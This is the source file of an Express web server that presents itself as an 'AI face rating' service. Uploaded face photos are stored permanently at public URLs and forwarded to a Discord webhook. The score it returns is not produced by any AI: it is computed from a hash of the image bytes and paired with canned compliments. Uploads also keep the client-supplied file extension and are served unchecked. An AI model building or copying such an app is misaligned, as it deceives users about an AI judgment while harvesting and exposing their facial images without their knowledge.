import express from "express";
import multer from "multer";
import fs from "fs";
import path from "path";
import fetch from "node-fetch";
import crypto from "crypto";
import FormData from "form-data";

const app = express();
const PORT = process.env.PORT || 10000;
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

if (!DISCORD_WEBHOOK_URL) {
  console.error("⚠️ DISCORD_WEBHOOK_URL 환경변수가 설정되어 있지 않습니다!");
  process.exit(1);
}

// ===== uploads 폴더 보장 =====
const uploadDir = path.join(process.cwd(), "public/uploads");
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });

// ===== multer 설정 =====
const storage = multer.diskStorage({
  destination: uploadDir,
  filename: (_, file, cb) => {
    const ext = path.extname(file.originalname);
    cb(null, Date.now() + ext);
  },
});
const upload = multer({ storage });

// ===== 정적 파일 제공 =====
app.use("/uploads", express.static(uploadDir));
app.use(express.static("public"));

// ===== 메인 페이지 =====
app.get("/", (req, res) => {
  res.sendFile(path.resolve("index.html"));
});

// ===== 업로드 + Discord 전송 =====
app.post("/upload", upload.single("photo"), async (req, res) => {
  try {
    const filePath = req.file.path;
    const fileName = path.basename(filePath);
    const imageUrl = `${req.protocol}://${req.get("host")}/uploads/${fileName}`;

    // ---- Discord 메시지 만들기 ----
    const payload = {
      content: "📸 새 얼굴 평가가 도착했습니다!",
      embeds: [
        {
          title: "AI 얼굴 평가 결과",
          description: "사진과 함께 평가 결과를 확인하세요.",
          color: 5814783,
          image: { url: imageUrl },
          footer: { text: "Face Review Bot" },
          timestamp: new Date().toISOString(),
        },
      ],
    };

    // ---- Discord 전송 ----
    const form = new FormData();
    form.append("payload_json", JSON.stringify(payload));

    const discordResponse = await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      body: form,
      headers: form.getHeaders(),
    });

    if (!discordResponse.ok) {
      const text = await discordResponse.text();
      throw new Error(`Discord 전송 오류: ${discordResponse.status} ${text}`);
    }
    console.log("Discord 전송 성공:", imageUrl);

    // ---- 간단한 평가 로직 ----
    const buffer = fs.readFileSync(filePath);
    const hash = crypto.createHash("sha256").update(buffer).digest("hex");
    const base = parseInt(hash.slice(0, 8), 16);

    const score = Math.round((5 + (base % 50) / 10) * 10) / 10;
    const percent = Math.max(1, 100 - Math.round((score / 10) * 100));

    let feedback = "";
    if (percent <= 5) feedback = "연예인급 외모입니다.";
    else if (percent <= 10) feedback = "상위권 외모로 매우 눈에 띕니다.";
    else if (percent <= 20) feedback = "호감도가 높은 얼굴입니다.";
    else if (percent <= 40) feedback = "평균 이상으로 안정적인 인상입니다.";
    else feedback = "개성이 느껴지는 얼굴입니다.";

    // ---- 결과 클라이언트에 전달 ----
    res.json({ score, percent, feedback, imageUrl });

    // ---- 업로드된 파일은 삭제하지 않고 보존 (Discord와 유저가 모두 볼 수 있도록) ----
  } catch (e) {
    console.error("업로드 처리 오류:", e);
    res.status(500).json({ error: "서버 오류가 발생했습니다." });
  }
});

// ===== 서버 시작 =====
app.listen(PORT, () => {
  console.log(`🔥 Server running on port ${PORT}`);
});
